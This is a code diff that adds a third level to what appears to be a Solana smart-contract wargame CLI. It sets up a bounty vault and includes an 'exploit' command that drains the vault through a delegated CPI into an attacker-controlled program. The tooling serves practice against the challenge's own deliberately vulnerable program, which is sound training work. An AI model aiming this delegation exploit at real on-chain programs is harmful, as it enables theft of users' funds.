@@ -3,10 +3,13 @@
 import fs from "node:fs";
 import os from "node:os";
 import path from "node:path";
+import crypto from "node:crypto";
+import util from "node:util";
 
 import {
   TOKEN_PROGRAM_ID,
   createAccount,
+  createAssociatedTokenAccountIdempotent,
   createMint,
   mintTo,
 } from "@solana/spl-token";
@@ -35,13 +38,17 @@ const DISCRIMINATORS = {
   initLevel0: Uint8Array.from([251, 245, 62, 63, 138, 203, 254, 44]),
   initBank: Uint8Array.from([73, 111, 27, 243, 202, 129, 159, 80]),
   initGlobalProfile: Uint8Array.from([58, 62, 122, 41, 39, 80, 228, 178]),
+  initGuildAuthority: Uint8Array.from([241, 234, 227, 188, 99, 147, 131, 208]),
   initLevel1: Uint8Array.from([250, 112, 168, 131, 246, 44, 13, 80]),
   initLevel2: Uint8Array.from([176, 62, 169, 146, 12, 173, 203, 149]),
+  initLevel3: Uint8Array.from([155, 8, 157, 98, 203, 185, 90, 129]),
+  delegateTask: Uint8Array.from([204, 242, 231, 107, 78, 130, 187, 57]),
   depositTokens: Uint8Array.from([176, 83, 229, 18, 191, 143, 176, 150]),
   updateProfile: Uint8Array.from([98, 67, 99, 206, 86, 115, 175, 1]),
   verifyAndCloseLevel0: Uint8Array.from([88, 24, 131, 11, 54, 23, 3, 18]),
   verifyAndCloseLevel1: Uint8Array.from([148, 124, 192, 9, 124, 227, 175, 140]),
   verifyAndCloseLevel2: Uint8Array.from([91, 176, 147, 203, 107, 214, 51, 62]),
+  verifyAndCloseLevel3: Uint8Array.from([42, 44, 43, 77, 76, 239, 178, 180]),
 };
 
 const HELP = `
@@ -66,6 +73,11 @@ Usage:
   npm run operator -- level2 verify [--rpc <url>] [--keypair <path>]
   npm run operator -- level2 status [--rpc <url>] [--keypair <path>]
 
+  npm run operator -- level3 setup [--rpc <url>] [--keypair <path>] [--amount <raw-units>]
+  npm run operator -- level3 exploit [--rpc <url>] [--keypair <path>] --external-program <pubkey>
+  npm run operator -- level3 verify [--rpc <url>] [--keypair <path>]
+  npm run operator -- level3 status [--rpc <url>] [--keypair <path>]
+
 Options:
   --rpc <url>                RPC endpoint. Defaults to SOLANA_RPC_URL/RPC_URL or devnet.
   --keypair <path>           Solana keypair JSON path. Defaults to ${DEFAULT_KEYPAIR_PATH}.
@@ -73,6 +85,7 @@ Options:
   --initial-commander <pk>   Initial non-player commander for Level 2 profile setup.
   --vault <pubkey>           Override the manifest vault token account for Level 1 exploit.
   --user-token-account <pk>  Override the manifest user token account for Level 1 exploit.
+  --external-program <pk>    External program to delegate into for Level 3.
   --amount <raw-units>       Raw token amount. Default: ${LEVEL_1_TARGET.toString()}.
   --manifest <path>          Optional manifest file path override.
   --help                     Print this help.
@@ -80,6 +93,7 @@ Options:
 Notes:
   - Level 0 can be completed directly from this CLI with level0 setup/verify.
   - Levels 1 and 2 require Level 0 to be completed for the connected operator wallet.
+  - Level 3 expects an attacker-controlled program. The sample mercenary program in the repo matches the default exploit payload.
   - Setup writes a manifest under ${MANIFEST_DIR}/ so later commands can reuse the generated addresses.
   - The CLI confirms the crack by reading on-chain state after each exploit and verify step.
 `.trim();
@@ -134,7 +148,12 @@ async function main() {
     return;
   }
 
-  throw new Error(`Unsupported level "${options.level}". Use level0, level1, or level2.`);
+  if (options.level === "level3") {
+    await handleLevel3(context);
+    return;
+  }
+
+  throw new Error(`Unsupported level "${options.level}". Use level0, level1, level2, or level3.`);
 }
 
 function loadEnvFile(filePath) {
@@ -168,6 +187,7 @@ function parseArgs(argv) {
     level,
     manifestPath: undefined,
     rpcUrl: DEFAULT_RPC_URL,
+    externalProgram: undefined,
     userTokenAccount: undefined,
     vault: undefined,
   };
@@ -199,6 +219,9 @@ function parseArgs(argv) {
         break;
       case "--user-token-account":
         options.userTokenAccount = nextValue();
+        break;
+      case "--external-program":
+        options.externalProgram = nextValue();
         break;
       case "--amount":
         options.amount = parseBigInt(nextValue(), "--amount");
@@ -247,16 +270,26 @@ function derivePdas(userPublicKey) {
     [Buffer.from("profile")],
     PROGRAM_ID
   );
+  const [guildAuthorityPda] = PublicKey.findProgramAddressSync(
+    [Buffer.from("guild_authority")],
+    PROGRAM_ID
+  );
   const [level2Pda] = PublicKey.findProgramAddressSync(
     [Buffer.from("level_2"), userPublicKey.toBuffer()],
+    PROGRAM_ID
+  );
+  const [level3Pda] = PublicKey.findProgramAddressSync(
+    [Buffer.from("level_3"), userPublicKey.toBuffer()],
     PROGRAM_ID
   );
 
   return {
     bankPda,
+    guildAuthorityPda,
     level0Pda,
     level1Pda,
     level2Pda,
+    level3Pda,
     profilePda,
     userStatsPda,
   };
@@ -740,6 +773,31 @@ async function handleLevel2(context) {
   }
 }
 
+async function handleLevel3(context) {
+  const pdas = derivePdas(context.payer.publicKey);
+  const userStats = await fetchUserStats(context.connection, pdas.userStatsPda);
+  ensureLevel0Unlocked(userStats);
+
+  switch (context.options.action) {
+    case "setup":
+      await handleLevel3Setup(context, pdas);
+      break;
+    case "exploit":
+      await handleLevel3Exploit(context, pdas);
+      break;
+    case "verify":
+      await handleLevel3Verify(context, pdas);
+      break;
+    case "status":
+      await printLevel3Status(context, pdas);
+      break;
+    default:
+      throw new Error(
+        `Unsupported level3 action "${context.options.action}". Use setup, exploit, verify, or status.`
+      );
+  }
+}
+
 async function handleLevel2Setup(context, pdas) {
   const manifestPath = resolveManifestPath(context, "level2");
   const profile = await fetchUserProfile(context.connection, pdas.profilePda);
@@ -927,6 +985,275 @@ async function printLevel2Status(context, pdas) {
   }
 }
 
+async function handleLevel3Setup(context, pdas) {
+  const manifestPath = resolveManifestPath(context, "level3");
+  const guildAuthority = await fetchGuildAuthority(
+    context.connection,
+    pdas.guildAuthorityPda
+  );
+  let rewardMint;
+  let bountyVault;
+  let userRewardAccount;
+
+  if (!guildAuthority) {
+    const rewardMintAuthority = context.payer.publicKey;
+    rewardMint = await createMint(
+      context.connection,
+      context.payer,
+      rewardMintAuthority,
+      null,
+      0
+    );
+    bountyVault = await createAccount(
+      context.connection,
+      context.payer,
+      rewardMint,
+      pdas.guildAuthorityPda,
+      Keypair.generate()
+    );
+    const mintSignature = await mintTo(
+      context.connection,
+      context.payer,
+      rewardMint,
+      bountyVault,
+      context.payer,
+      Number(context.options.amount)
+    );
+
+    const initGuildAuthorityIx = buildInitGuildAuthorityInstruction(
+      context.payer.publicKey,
+      pdas.guildAuthorityPda,
+      rewardMint,
+      bountyVault,
+      context.options.amount
+    );
+    const signature = await sendInstructions(context.connection, context.payer, [
+      initGuildAuthorityIx,
+    ]);
+    console.log(`Initialized guild authority PDA: ${pdas.guildAuthorityPda.toBase58()}`);
+    console.log(`  tx: ${signature}`);
+    console.log(`  mint tx: ${mintSignature}`);
+  } else {
+    rewardMint = guildAuthority.rewardMint;
+    bountyVault = guildAuthority.bountyVault;
+    console.log(`Guild authority already exists: ${pdas.guildAuthorityPda.toBase58()}`);
+  }
+
+  const level3State = await fetchLevel3State(context.connection, pdas.level3Pda);
+  if (!level3State) {
+    const initLevel3Ix = buildInitLevel3Instruction(
+      context.payer.publicKey,
+      pdas.userStatsPda,
+      pdas.level3Pda
+    );
+    const signature = await sendInstructions(context.connection, context.payer, [
+      initLevel3Ix,
+    ]);
+    console.log(`Initialized Level 3 state: ${pdas.level3Pda.toBase58()}`);
+    console.log(`  tx: ${signature}`);
+  } else {
+    console.log(`Level 3 state already exists: ${pdas.level3Pda.toBase58()}`);
+  }
+
+  userRewardAccount = await createAssociatedTokenAccountIdempotent(
+    context.connection,
+    context.payer,
+    rewardMint,
+    context.payer.publicKey
+  );
+
+  const manifest = {
+    cluster: context.cluster,
+    generatedAt: new Date().toISOString(),
+    kind: "level3",
+    operator: context.payer.publicKey.toBase58(),
+    rpcUrl: context.rpcUrl,
+    amount: context.options.amount.toString(),
+    addresses: {
+      guildAuthority: pdas.guildAuthorityPda.toBase58(),
+      rewardMint: rewardMint.toBase58(),
+      bountyVault: bountyVault.toBase58(),
+      userRewardAccount: userRewardAccount.toBase58(),
+      level3State: pdas.level3Pda.toBase58(),
+      userStats: pdas.userStatsPda.toBase58(),
+    },
+  };
+  saveManifest(manifestPath, manifest);
+
+  console.log("");
+  console.log("LEVEL 3 SETUP READY");
+  console.log(`  Guild authority:    ${pdas.guildAuthorityPda.toBase58()}`);
+  console.log(`  Level 3 state:      ${pdas.level3Pda.toBase58()}`);
+  console.log(`  Reward mint:        ${rewardMint.toBase58()}`);
+  console.log(`  Bounty vault:       ${bountyVault.toBase58()}`);
+  console.log(`  User reward acct:   ${userRewardAccount.toBase58()}`);
+  console.log(`  Raw amount:         ${context.options.amount.toString()}`);
+  console.log(`  Manifest:           ${manifestPath}`);
+  console.log("");
+  console.log("Next:");
+  console.log("  1. Deploy the sample mercenary program or your own attacker program.");
+  console.log("  2. Run:");
+  console.log("     npm run operator -- level3 exploit --external-program <program-id>");
+  console.log("     npm run operator -- level3 verify");
+}
+
+async function handleLevel3Exploit(context, pdas) {
+  const manifestPath = resolveManifestPath(context, "level3");
+  const manifest = loadManifest(manifestPath, "level3");
+  const guildAuthority = await fetchGuildAuthority(
+    context.connection,
+    pdas.guildAuthorityPda
+  );
+  if (!guildAuthority) {
+    throw new Error("Guild authority is missing. Run `level3 setup` first.");
+  }
+
+  const level3State = await fetchLevel3State(context.connection, pdas.level3Pda);
+  if (!level3State) {
+    throw new Error("Level 3 state is missing. Run `level3 setup` first.");
+  }
+
+  if (!context.options.externalProgram) {
+    throw new Error(
+      "Level 3 exploit requires --external-program <pubkey> for your attacker contract."
+    );
+  }
+
+  const externalProgram = parsePublicKey(
+    context.options.externalProgram,
+    "External program"
+  );
+  const userRewardAccount = parsePublicKey(
+    manifest.addresses.userRewardAccount,
+    "User reward token account"
+  );
+
+  const exploitIx = buildDelegateTaskInstruction(
+    context.payer.publicKey,
+    pdas.level3Pda,
+    pdas.guildAuthorityPda,
+    guildAuthority.bountyVault,
+    userRewardAccount,
+    externalProgram,
+    buildMercenaryFollowOrdersData(guildAuthority.bountyAmount)
+  );
+  const signature = await sendInstructions(context.connection, context.payer, [
+    exploitIx,
+  ]);
+
+  const rewardAccount = await context.connection.getTokenAccountBalance(
+    userRewardAccount,
+    "confirmed"
+  );
+  const cracked =
+    BigInt(rewardAccount.value.amount) >= guildAuthority.bountyAmount;
+
+  console.log("");
+  console.log("LEVEL 3 EXPLOIT RESULT");
+  console.log(`  tx:                ${signature}`);
+  console.log(`  Reward account:    ${userRewardAccount.toBase58()}`);
+  console.log(`  Reward amount:     ${rewardAccount.value.amount}`);
+  console.log(`  Target:            ${guildAuthority.bountyAmount.toString()}`);
+  console.log(`  Status:            ${cracked ? "CRACKED" : "NOT CRACKED"}`);
+  console.log("");
+  if (cracked) {
+    console.log("Success: the delegated CPI drained the guild bounty to your account.");
+    console.log("Next: npm run operator -- level3 verify");
+  } else {
+    console.log("The delegated CPI did not drain enough tokens yet.");
+  }
+}
+
+async function handleLevel3Verify(context, pdas) {
+  const manifestPath = resolveManifestPath(context, "level3");
+  const manifest = loadManifest(manifestPath, "level3");
+  const level3State = await fetchLevel3State(context.connection, pdas.level3Pda);
+  if (!level3State) {
+    throw new Error("Level 3 state is already closed or missing.");
+  }
+
+  const verifyIx = buildVerifyAndCloseLevel3Instruction(
+    context.payer.publicKey,
+    pdas.userStatsPda,
+    pdas.guildAuthorityPda,
+    parsePublicKey(manifest.addresses.userRewardAccount, "User reward token account"),
+    pdas.level3Pda
+  );
+  const signature = await sendInstructions(context.connection, context.payer, [
+    verifyIx,
+  ]);
+
+  const userStats = await fetchUserStats(context.connection, pdas.userStatsPda);
+  const level3StateAfter = await fetchLevel3State(context.connection, pdas.level3Pda);
+  const verified = Boolean(
+    userStats?.completedLevels[3] && level3StateAfter === null
+  );
+
+  console.log("");
+  console.log("LEVEL 3 VERIFY RESULT");
+  console.log(`  tx:                ${signature}`);
+  console.log(`  completed[3]:      ${userStats?.completedLevels[3] ? "true" : "false"}`);
+  console.log(`  level3 PDA open:   ${level3StateAfter ? "yes" : "no"}`);
+  console.log(`  Status:            ${verified ? "VERIFIED" : "FAILED"}`);
+  console.log("");
+  if (verified) {
+    console.log("Success: Level 3 is completed and the PDA was closed.");
+  } else {
+    console.log("Verification did not settle correctly. Inspect on-chain state with:");
+    console.log("  npm run operator -- level3 status");
+  }
+}
+
+async function printLevel3Status(context, pdas) {
+  const manifestPath = resolveManifestPath(context, "level3");
+  const manifest = tryLoadManifest(manifestPath);
+  const [userStats, guildAuthority, level3State] = await Promise.all([
+    fetchUserStats(context.connection, pdas.userStatsPda),
+    fetchGuildAuthority(context.connection, pdas.guildAuthorityPda),
+    fetchLevel3State(context.connection, pdas.level3Pda),
+  ]);
+
+  console.log("");
+  console.log("LEVEL 3 STATUS");
+  console.log(`  UserStats:         ${pdas.userStatsPda.toBase58()}`);
+  console.log(`  Level 0 cleared:   ${userStats?.completedLevels[0] ? "yes" : "no"}`);
+  console.log(`  Level 3 complete:  ${userStats?.completedLevels[3] ? "yes" : "no"}`);
+  console.log(`  Guild exists:      ${guildAuthority ? "yes" : "no"}`);
+  console.log(`  Level3 exists:     ${level3State ? "yes" : "no"}`);
+  console.log(`  Reward mint:       ${guildAuthority?.rewardMint.toBase58() ?? "-"}`);
+  console.log(`  Bounty vault:      ${guildAuthority?.bountyVault.toBase58() ?? "-"}`);
+  console.log(`  Bounty amount:     ${guildAuthority?.bountyAmount.toString() ?? "0"}`);
+
+  if (manifest?.addresses?.userRewardAccount) {
+    const rewardPubkey = parsePublicKey(
+      manifest.addresses.userRewardAccount,
+      "User reward token account"
+    );
+    const rewardBalance = await context.connection.getTokenAccountBalance(
+      rewardPubkey,
+      "confirmed"
+    );
+    console.log(`  User reward acct:  ${rewardPubkey.toBase58()}`);
+    console.log(`  Reward balance:    ${rewardBalance.value.amount}`);
+    console.log(
+      `  Contract cracked:  ${
+        guildAuthority &&
+        BigInt(rewardBalance.value.amount) >= guildAuthority.bountyAmount
+          ? "yes"
+          : "no"
+      }`
+    );
+  } else {
+    console.log("  User reward acct:  -");
+    console.log("  Reward balance:    -");
+    console.log("  Contract cracked:  no");
+  }
+
+  if (manifest) {
+    console.log(`  Manifest:          ${manifestPath}`);
+  }
+}
+
 function ensureLevel0Unlocked(userStats) {
   if (!userStats) {
     throw new Error(
@@ -1002,6 +1329,28 @@ async function fetchLevel2State(connection, publicKey) {
   return {
     bump: account.data[40],
     player: new PublicKey(account.data.slice(8, 40)),
+  };
+}
+
+async function fetchGuildAuthority(connection, publicKey) {
+  const account = await connection.getAccountInfo(publicKey, "confirmed");
+  if (!account) return null;
+
+  return {
+    rewardMint: new PublicKey(account.data.slice(8, 40)),
+    bountyVault: new PublicKey(account.data.slice(40, 72)),
+    bountyAmount: account.data.readBigUInt64LE(72),
+    bump: account.data[80],
+  };
+}
+
+async function fetchLevel3State(connection, publicKey) {
+  const account = await connection.getAccountInfo(publicKey, "confirmed");
+  if (!account) return null;
+
+  return {
+    player: new PublicKey(account.data.slice(8, 40)),
+    bump: account.data[40],
   };
 }
 
@@ -1135,6 +1484,30 @@ function buildInitGlobalProfileInstruction(admin, profile, initialCommander) {
   });
 }
 
+function buildInitGuildAuthorityInstruction(
+  admin,
+  guildAuthority,
+  rewardMint,
+  bountyVault,
+  bountyAmount
+) {
+  const data = Buffer.alloc(16);
+  Buffer.from(DISCRIMINATORS.initGuildAuthority).copy(data, 0);
+  data.writeBigUInt64LE(bountyAmount, 8);
+
+  return new TransactionInstruction({
+    programId: PROGRAM_ID,
+    keys: [
+      { pubkey: admin, isSigner: true, isWritable: true },
+      { pubkey: guildAuthority, isSigner: false, isWritable: true },
+      { pubkey: rewardMint, isSigner: false, isWritable: false },
+      { pubkey: bountyVault, isSigner: false, isWritable: false },
+      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
+    ],
+    data,
+  });
+}
+
 function buildInitLevel2Instruction(user, userStats, level2State) {
   return new TransactionInstruction({
     programId: PROGRAM_ID,
@@ -1145,6 +1518,48 @@ function buildInitLevel2Instruction(user, userStats, level2State) {
       { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
     ],
     data: Buffer.from(DISCRIMINATORS.initLevel2),
+  });
+}
+
+function buildInitLevel3Instruction(user, userStats, level3State) {
+  return new TransactionInstruction({
+    programId: PROGRAM_ID,
+    keys: [
+      { pubkey: user, isSigner: true, isWritable: true },
+      { pubkey: userStats, isSigner: false, isWritable: true },
+      { pubkey: level3State, isSigner: false, isWritable: true },
+      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
+    ],
+    data: Buffer.from(DISCRIMINATORS.initLevel3),
+  });
+}
+
+function buildDelegateTaskInstruction(
+  user,
+  level3State,
+  guildAuthority,
+  bountyVault,
+  userRewardAccount,
+  externalProgram,
+  taskData
+) {
+  const data = Buffer.concat([
+    Buffer.from(DISCRIMINATORS.delegateTask),
+    encodeVecBytes(taskData),
+  ]);
+
+  return new TransactionInstruction({
+    programId: PROGRAM_ID,
+    keys: [
+      { pubkey: user, isSigner: true, isWritable: true },
+      { pubkey: level3State, isSigner: false, isWritable: true },
+      { pubkey: guildAuthority, isSigner: false, isWritable: false },
+      { pubkey: bountyVault, isSigner: false, isWritable: true },
+      { pubkey: userRewardAccount, isSigner: false, isWritable: true },
+      { pubkey: externalProgram, isSigner: false, isWritable: false },
+      { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
+    ],
+    data,
   });
 }
 
@@ -1174,6 +1589,26 @@ function buildVerifyAndCloseLevel2Instruction(
       { pubkey: profile, isSigner: false, isWritable: false },
     ],
     data: Buffer.from(DISCRIMINATORS.verifyAndCloseLevel2),
+  });
+}
+
+function buildVerifyAndCloseLevel3Instruction(
+  user,
+  userStats,
+  guildAuthority,
+  userRewardAccount,
+  level3State
+) {
+  return new TransactionInstruction({
+    programId: PROGRAM_ID,
+    keys: [
+      { pubkey: user, isSigner: true, isWritable: true },
+      { pubkey: userStats, isSigner: false, isWritable: true },
+      { pubkey: guildAuthority, isSigner: false, isWritable: false },
+      { pubkey: userRewardAccount, isSigner: false, isWritable: false },
+      { pubkey: level3State, isSigner: false, isWritable: true },
+    ],
+    data: Buffer.from(DISCRIMINATORS.verifyAndCloseLevel3),
   });
 }
 
@@ -1245,6 +1680,28 @@ function parseBigInt(value, label) {
   }
 }
 
+function encodeVecBytes(bytes) {
+  const body = Buffer.from(bytes);
+  const length = Buffer.alloc(4);
+  length.writeUInt32LE(body.length, 0);
+  return Buffer.concat([length, body]);
+}
+
+function getAnchorDiscriminator(name) {
+  return crypto
+    .createHash("sha256")
+    .update(`global:${name}`)
+    .digest()
+    .subarray(0, 8);
+}
+
+function buildMercenaryFollowOrdersData(amount) {
+  const data = Buffer.alloc(16);
+  getAnchorDiscriminator("follow_orders").copy(data, 0);
+  data.writeBigUInt64LE(amount, 8);
+  return data;
+}
+
 function detectCluster(rpcUrl) {
   const lowered = rpcUrl.toLowerCase();
   if (
@@ -1270,6 +1727,8 @@ function printBanner(context, level, action) {
 }
 
 function formatError(error) {
-  if (error instanceof Error) return error.message;
-  return String(error);
+  if (error instanceof Error) {
+    return error.message || error.stack || error.name;
+  }
+  return util.inspect(error, { depth: 4, breakLength: 120 });
 }
